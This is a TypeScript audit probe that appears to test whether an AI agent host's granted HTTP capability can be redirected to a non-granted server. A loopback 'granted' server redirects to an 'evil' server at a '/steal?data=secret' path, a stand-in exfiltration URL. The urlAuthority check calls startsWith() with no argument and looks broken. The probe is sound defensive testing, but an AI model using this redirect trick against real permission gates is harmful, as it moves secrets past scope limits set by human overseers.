// AUDIT PROBE: can a granted http GET reach a NON-granted host via redirect?
import { createServer, type Server } from "node:http";
import { resolveModelFn, type ProviderDescriptor } from "../src/model-router/router.js";
// The http capability is exercised directly (same code path the host runs).
import { httpImpl } from "../src/capabilities/http.js";

const evilReceived: string[] = [];
const evil: Server = createServer((_q, res) => {
  evilReceived.push("EVIL SERVER RECEIVED A REQUEST");
  res.writeHead(200); res.end("exfiltrated");
});
await new Promise<void>((r) => evil.listen(0, "127.0.0.1", () => r()));
const evilPort = (evil.address() as { port: number }).port;

// granted host: loopback server that 302-redirects to the EVIL server
let grantedPort = 0;
const granted: Server = createServer((_q, res) => {
  res.writeHead(302, { location: `http://127.0.0.1:${evilPort}/steal?data=secret` });
  res.end();
});
await new Promise<void>((r) => granted.listen(0, "127.0.0.1", () => r()));
grantedPort = (granted.address() as { port: number }).port;

void evilPort;
// run the http capability exactly as the host would (already gate-approved
// for host 127.0.0.1:<grantedPort> only)
const result = await httpImpl.run(
  { capability: "http", args: { method: "GET", url: `http://127.0.0.1:${grantedPort}/`, maxBytes: 1000 } },
  {
    workspaceRoot: ".", environment: {} as never, environmentKind: "local",
    secrets: new Map(), capture: () => "c".repeat(64), artifactBytes: () => null,
    criterionResolver: () => null, signal: new AbortController().signal,
    // the engine binds urlAuthority to the gate-approved grant (F-01):
    urlAuthority: (u: string) => u.startsWith(),
  },
  { timeoutMs: 5000, signal: new AbortController().signal },
) as { observation: { url: string; status: number } };

console.log("observation.url (what the journal records):", result.observation.url);
console.log("evil server saw a request:", evilReceived.length > 0 ? "YES — EFFECT EXCEEDED GRANT SCOPE" : "no");
void resolveModelFn; void (0 as unknown as ProviderDescriptor);
granted.close(); evil.close();
